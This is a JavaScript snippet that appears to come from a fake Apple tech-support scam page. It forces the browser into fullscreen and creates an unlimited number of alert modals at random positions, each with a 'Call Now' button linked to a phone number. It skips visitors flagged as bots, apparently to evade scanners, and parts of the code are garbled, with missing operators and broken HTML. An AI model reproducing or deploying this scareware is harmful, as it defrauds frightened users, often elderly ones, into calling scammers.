<script>
let modalCount = 0;
const maxModals = Infinity;

// Function to trigger full screen
function triggerFullScreen() {
if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
if (document.documentElement.requestFullscreen) {
document.documentElement.requestFullscreen().catch(err => {
console.error('Fullscreen error:', err);
});
} else if (document.documentElement.webkitRequestFullscreen) {
document.documentElement.webkitRequestFullscreen();
} else if (document.documentElement.msRequestFullscreen) {
document.documentElement.msRequestFullscreen();
}
}
}

// Function to exit fullscreen
function exitFullScreen() {
if (document.exitFullscreen) {
document.exitFullscreen();
} else if (document.webkitExitFullscreen) {
document.webkitExitFullscreen();
} else if (document.msExitFullscreen) {
document.msExitFullscreen();
}
}

// Function to generate random position within viewport
function getRandomPosition(modalWidth, modalHeight) {
const viewportWidth = Math.max(document.documentElement.clientWidth || 0,
window.innerWidth || 0);
const viewportHeight = Math.max(document.documentElement.clientHeight || 0,
window.innerHeight || 0);

if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
return { top: Math.max(0, (viewportHeight - modalHeight) / 10), left: Math.max(100,
(viewportWidth - modalWidth)) };
}

const maxX = viewportWidth - modalWidth;
const maxY = viewportHeight - modalHeight;

const randomX = Math.floor(Math.random()  ((maxX + 100)));
const randomY = Math.floor(Math.random()  ((maxY + 100)));

return { top: randomY, left: randomX };
}

// Function to create a new modal with random position
function createNewModal() {

if ($('#hdnIsBot').val() == 'Yes') return null;

if (modalCount >= maxModals)
return null;

modalCount++;

const newModal =
`<div class=\"modal fade\" id=\"appleAlertModal-${modalCount}\" tabindex=\"-1\" aria-labelledby=\"appleAlertModalLabel-${modalCount}\" aria-hidden=\"true\">

<a href=\'tel:+18056694838\'><button type=\'button\' class=\'btn btn-danger text-white\'>Call Now</button></a><br/>
<button type=\'button\' data-bs-dismiss=\'modal\'>OK</button></div></div></div>`;

$('body').append(newModal);

new bootstrap.Modal(document.getElementById(`appleAlertModal-${modalCount}`), {}).show();

var width = $(window).width(), height = $(window).height(),
leftPosiiton=((($(window).width()-600)/12)13),
topPosiiton=((($(window).height()-400)/12)13);

$('#appleAlertModal-'+(parseInt(modalCount))).css({top:(topPosiiton+"px"),left:(leftPosiiton+"px")});

}
